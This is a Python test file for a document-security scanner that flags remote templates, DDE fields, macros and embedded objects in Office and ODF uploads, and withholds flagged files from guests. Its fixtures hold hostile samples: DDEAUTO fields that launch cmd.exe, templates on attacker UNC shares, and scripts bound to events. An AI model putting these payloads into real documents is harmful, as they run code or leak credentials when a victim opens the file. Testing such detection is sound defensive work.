"""Remote parts loaded when a document opens, and the
share resolve path for documents held for review."""

from __future__ import annotations

import pytest
from sqlalchemy import select

from app.models import Asset, ShareLink
from app.office_extract import _scan_rels, extract_office
from app.slug import generate_token
from tests.conftest import login_as, mk_user
from tests.office_factory import _ODF_NS, _zip, make_docx, office_file
from tests.pdf_factory import make_pdf, pdf_file

_RELS = '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">{}</Relationships>'


def _rels(*relationships: str) -> bytes:
    return _RELS.format("".join(relationships)).encode()


def test_linked_remote_image_is_an_external_reference():
    found: dict[str, str] = {}
    _scan_rels(
        _rels(
            '<Relationship Id="i" Type="x/image" Target="\\\\attacker\\share\\a.png" '
            'TargetMode="External"/>'
        ),
        found,
    )
    assert found == {"office_external_reference": "warn"}


def test_remote_template_stays_critical_next_to_a_linked_image():
    found: dict[str, str] = {}
    _scan_rels(
        _rels(
            '<Relationship Id="i" Type="x/image" Target="https://x.example/a.png" TargetMode="External"/>',
            '<Relationship Id="t" Type="x/attachedTemplate" Target="https://x.example/t.dotm" '
            'TargetMode="External"/>',
        ),
        found,
    )
    assert found == {"office_external_reference": "warn", "office_remote_template": "critical"}


@pytest.mark.parametrize(
    ("element", "expected"),
    [
        (
            '<draw:frame><draw:image xlink:href="http://x.example/a.png"/></draw:frame>',
            {"office_external_reference": "warn"},
        ),
        (
            '<draw:frame><draw:object xlink:href="\\\\host\\o"/></draw:frame>',
            {"office_embedded_object": "warn", "office_external_reference": "warn"},
        ),
        ('<draw:frame><draw:image xlink:href="Pictures/local.png"/></draw:frame>', {}),
        ('<text:a xlink:href="https://example.com">link</text:a>', {}),
    ],
    ids=["remote-image", "unc-object", "embedded-image", "hyperlink"],
)
def test_odt_parts_loaded_on_open_are_flagged(element, expected):
    content = (
        f"<office:document-content {_ODF_NS}><office:body><office:text>"
        f"<text:p>{element}</text:p></office:text></office:body></office:document-content>"
    )
    data = _zip({"mimetype": "application/vnd.oasis.opendocument.text", "content.xml": content})
    result = extract_office(data, max_chars=10_000, max_unzipped=10_000_000)
    assert {f["rule"]: f["severity"] for f in result["findings"]} == expected


async def _held_asset(client, session, *, upload, data, name):
    owner = await mk_user(session)
    guest = await mk_user(session)
    await session.commit()
    await login_as(client, owner)
    r = await client.post(upload, files=data(name))
    assert r.status_code == 201, r.text
    asset = await session.scalar(select(Asset).where(Asset.slug == r.json()["slug"]))
    assert asset is not None
    assert asset.security_status == "critical"
    token = generate_token()
    session.add(ShareLink(asset_id=asset.id, token=token, mode="public", created_by=owner.id))
    await session.commit()
    return owner, guest, token


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("upload", "files", "name"),
    [
        (
            "/api/assets/document",
            lambda n: office_file(n, make_docx([("p", "secret plan")], macros=True)),
            "m.docx",
        ),
        ("/api/assets/pdf", lambda n: pdf_file(n, make_pdf(["secret plan"], launch=True)), "l.pdf"),
    ],
    ids=["office-macros", "pdf-launch"],
)
async def test_resolve_withholds_held_documents_from_guests(
    client, session, fs_storage, upload, files, name
):
    _owner, guest, token = await _held_asset(client, session, upload=upload, data=files, name=name)

    r = await client.post(f"/api/share/{token}/resolve", json={})
    assert r.status_code == 200, r.text
    assert "secret plan" in r.json()["content"]

    await client.post("/api/auth/logout")
    await login_as(client, guest)
    r = await client.post(f"/api/share/{token}/resolve", json={})
    assert r.status_code == 410
    assert r.json()["code"] == "bundle_withheld"


def _docx_with(extra: dict[str, str], content_types: str = "") -> bytes:
    """A .docx whose package gets `extra` parts and extra content types."""
    import io
    import zipfile

    src = zipfile.ZipFile(io.BytesIO(make_docx([("p", "x")])))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as zf:
        for name in src.namelist():
            data = src.read(name)
            if name == "[Content_Types].xml" and content_types:
                data = data.replace(b"</Types>", content_types.encode() + b"</Types>")
            zf.writestr(name, data)
        for name, data in extra.items():
            zf.writestr(name, data)
    return out.getvalue()


def _findings(data: bytes) -> dict[str, str]:
    result = extract_office(data, max_chars=10_000, max_unzipped=10_000_000)
    assert result["ok"], result
    return {f["rule"]: f["severity"] for f in result["findings"]}


def test_macros_under_another_name_are_found_by_type():
    by_content_type = _docx_with(
        {"word/stuff.bin": "vba"},
        '<Override PartName="/word/stuff.bin" ContentType="application/vnd.ms-office.vbaProject"/>',
    )
    assert _findings(by_content_type) == {"office_macros": "critical"}
    found: dict[str, str] = {}
    _scan_rels(
        _rels(
            '<Relationship Id="v" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="stuff.bin"/>'
        ),
        found,
    )
    assert found == {"office_macros": "critical"}


@pytest.mark.parametrize(
    ("target", "expected"),
    [
        ("file://evil.example/share/t.dotm", {"office_remote_template": "critical"}),
        ("file:///C:/Templates/Normal.dotm", {"office_external_reference": "warn"}),
    ],
    ids=["file-host", "file-local"],
)
def test_file_urls_with_a_host_are_remote(target, expected):
    found: dict[str, str] = {}
    _scan_rels(
        _rels(
            f'<Relationship Id="t" Type="x/attachedTemplate" Target="{target}" TargetMode="External"/>'
        ),
        found,
    )
    assert found == expected


@pytest.mark.parametrize(
    ("template", "expected"),
    [
        ("\\\\attacker\\share\\evil.dot", {"office_remote_template": "critical"}),
        ("C:\\Templates\\Normal.dot", {}),
        (None, {}),
    ],
    ids=["unc", "local", "none"],
)
def test_doc_attached_template(template, expected):
    from tests.office_factory import doc_text, make_doc

    assert _findings(make_doc(doc_text(["x"]), template=template)) == expected


@pytest.mark.asyncio
async def test_file_mcp_withholds_held_documents_from_read_only_roles(client, session, fs_storage):
    from app.models import AssetShare

    owner = await mk_user(session)
    reader = await mk_user(session)
    await session.commit()
    await login_as(client, owner)
    r = await client.post(
        "/api/assets/document",
        files=office_file("m.docx", make_docx([("p", "held text")], macros=True)),
    )
    slug = r.json()["slug"]
    asset = await session.scalar(select(Asset).where(Asset.slug == slug))
    assert asset is not None
    session.add(AssetShare(asset_id=asset.id, user_id=reader.id, role="viewer"))
    await session.commit()

    assert (await client.get(f"/api/assets/by-slug/{slug}/file-mcp")).status_code == 200
    await client.post("/api/auth/logout")
    await login_as(client, reader)
    for query in ("", "?format=raw&encoding=base64"):
        r = await client.get(f"/api/assets/by-slug/{slug}/file-mcp{query}")
        assert r.status_code == 410, query
        assert r.json()["code"] == "bundle_withheld"


def _docx_body(body_xml: str) -> bytes:
    """A .docx whose document.xml body is `body_xml`."""
    import io
    import zipfile

    src = zipfile.ZipFile(io.BytesIO(make_docx([("p", "x")])))
    out = io.BytesIO()
    w = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
    with zipfile.ZipFile(out, "w") as zf:
        for name in src.namelist():
            data = src.read(name)
            if name == "word/document.xml":
                data = (
                    f'<w:document xmlns:w="{w}"><w:body>{body_xml}</w:body></w:document>'.encode()
                )
            zf.writestr(name, data)
    return out.getvalue()


@pytest.mark.parametrize(
    ("body", "expected"),
    [
        (
            '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText></w:r>'
            '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>',
            {"office_dde": "critical"},
        ),
        ('<w:p><w:fldSimple w:instr=" DDE excel sheet1 r1c1 "/></w:p>', {"office_dde": "critical"}),
        (
            "<w:p><w:fldSimple w:instr=' INCLUDEPICTURE \"http://tracker.example/p.png\" \\d '/></w:p>",
            {"office_external_reference": "warn"},
        ),
        ('<w:p><w:fldSimple w:instr=" PAGE "/></w:p>', {}),
    ],
    ids=["ddeauto", "dde-simple", "includepicture-remote", "page-field"],
)
def test_docx_field_instructions(body, expected):
    assert _findings(_docx_body(body)) == expected


def test_embedded_objects_are_found_by_relationship_and_content_type():
    found: dict[str, str] = {}
    _scan_rels(
        _rels('<Relationship Id="o" Type="x/oleObject" Target="media/obj.bin"/>'),
        found,
    )
    assert found == {"office_embedded_object": "warn"}
    by_type = _docx_with(
        {"word/media/obj.bin": "ole"},
        '<Override PartName="/word/media/obj.bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>',
    )
    assert _findings(by_type) == {"office_embedded_object": "warn"}


def test_mhtml_wrapped_object_is_remote():
    found: dict[str, str] = {}
    _scan_rels(
        _rels(
            '<Relationship Id="o" Type="x/oleObject" Target="mhtml:http://x.example/a.html!x-usc:http://x.example/a.html" '
            'TargetMode="External"/>'
        ),
        found,
    )
    assert found == {"office_remote_template": "critical"}


def test_odt_dde_connection_is_critical():
    content = (
        f"<office:document-content {_ODF_NS}><office:body><office:text>"
        "<text:dde-connection-decls><text:dde-connection-decl office:name='x'/></text:dde-connection-decls>"
        "<text:p>x</text:p></office:text></office:body></office:document-content>"
    )
    data = _zip({"mimetype": "application/vnd.oasis.opendocument.text", "content.xml": content})
    assert _findings(data) == {"office_dde": "critical"}


def test_doc_dde_field_is_critical():
    from tests.office_factory import doc_text, make_doc

    text = doc_text(['before \x13 DDEAUTO c:\\\\cmd.exe "/c calc" \x14shown\x15 after'])
    result = extract_office(make_doc(text), max_chars=10_000, max_unzipped=10_000_000)
    assert {f["rule"]: f["severity"] for f in result["findings"]} == {"office_dde": "critical"}
    assert "shown" in result["markdown"]
    assert "cmd.exe" not in result["markdown"]


def test_ddeauto_split_across_instr_text_runs_is_found():
    body = (
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        "<w:r><w:instrText> DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\\\cmd.exe</w:instrText></w:r>"
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>x</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )
    assert _findings(_docx_body(body)) == {"office_dde": "critical"}


def test_two_separate_fields_do_not_merge_into_a_keyword():
    body = (
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>DD</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>E PAGE</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )
    assert _findings(_docx_body(body)) == {}


def test_odt_object_under_any_part_name_is_embedded():
    content = (
        f"<office:document-content {_ODF_NS}><office:body><office:text><text:p>"
        "<draw:frame><draw:object-ole xlink:href='./Embedded/thing'/></draw:frame>"
        "</text:p></office:text></office:body></office:document-content>"
    )
    data = _zip({"mimetype": "application/vnd.oasis.opendocument.text", "content.xml": content})
    assert _findings(data) == {"office_embedded_object": "warn"}


@pytest.mark.parametrize(
    "target",
    ["file:////attacker/share/t.dotm", "file:///\\\\attacker\\share\\t.dotm"],
    ids=["four-slashes", "slash-backslash"],
)
def test_file_url_unc_forms_are_remote(target):
    found: dict[str, str] = {}
    _scan_rels(
        _rels(
            f'<Relationship Id="t" Type="x/attachedTemplate" Target="{target}" TargetMode="External"/>'
        ),
        found,
    )
    assert found == {"office_remote_template": "critical"}


@pytest.mark.parametrize(
    "element",
    [
        "<office:event-listeners><script:event-listener xmlns:script='urn:oasis:names:tc:opendocument:xmlns:script:1.0' "
        "script:language='ooo:script' script:event-name='dom:mouseover' "
        "xlink:href='vnd.sun.star.script:LibreLogo|LibreLogo.py$run?language=Python&amp;location=share'/>"
        "</office:event-listeners>",
        "<text:execute-macro text:name='Standard.Module1.Run'>click</text:execute-macro>",
    ],
    ids=["event-listener", "execute-macro"],
)
def test_odt_scripts_bound_to_events_are_macros(element):
    content = (
        f"<office:document-content {_ODF_NS}><office:body><office:text>"
        f"<text:p>{element}</text:p></office:text></office:body></office:document-content>"
    )
    data = _zip({"mimetype": "application/vnd.oasis.opendocument.text", "content.xml": content})
    assert _findings(data) == {"office_macros": "critical"}


def test_alt_chunk_is_an_embedded_object():
    found: dict[str, str] = {}
    _scan_rels(_rels('<Relationship Id="a" Type="x/aFChunk" Target="chunk.rtf"/>'), found)
    assert found == {"office_embedded_object": "warn"}


def test_odt_script_urls_anywhere_are_macros():
    content = (
        f"<office:document-content {_ODF_NS}><office:body><office:text><text:p>"
        "<draw:frame><draw:image xlink:href='macro:///Standard.Module1.Main'/></draw:frame>"
        "</text:p></office:text></office:body></office:document-content>"
    )
    data = _zip({"mimetype": "application/vnd.oasis.opendocument.text", "content.xml": content})
    assert _findings(data) == {"office_macros": "critical"}


def test_docx_form_field_macros_are_macros():
    body = (
        '<w:p><w:r><w:fldChar w:fldCharType="begin"><w:ffData><w:name w:val="f"/>'
        '<w:entryMacro w:val="AutoRun"/></w:ffData></w:fldChar></w:r>'
        '<w:r><w:instrText> FORMTEXT </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )
    assert _findings(_docx_body(body)) == {"office_macros": "critical"}


def test_strict_ooxml_fields_are_scanned_by_local_name():
    import io
    import zipfile

    strict = "http://purl.oclc.org/ooxml/wordprocessingml/main"
    document = (
        f'<w:document xmlns:w="{strict}"><w:body><w:p>'
        '<w:fldSimple w:instr=" DDEAUTO c:\\\\cmd.exe "/></w:p></w:body></w:document>'
    )
    src = zipfile.ZipFile(io.BytesIO(make_docx([("p", "x")])))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as zf:
        for name in src.namelist():
            zf.writestr(name, document if name == "word/document.xml" else src.read(name))
        # The same field in a part outside word/ (the main part can be moved).
        zf.writestr("custom/main.xml", document)
    assert _findings(out.getvalue()) == {"office_dde": "critical"}


def test_file_backslash_unc_template_is_remote():
    found: dict[str, str] = {}
    _scan_rels(
        _rels(
            '<Relationship Id="t" Type="x/attachedTemplate" Target="file:\\\\host\\share\\t.dotm" '
            'TargetMode="External"/>'
        ),
        found,
    )
    assert found == {"office_remote_template": "critical"}
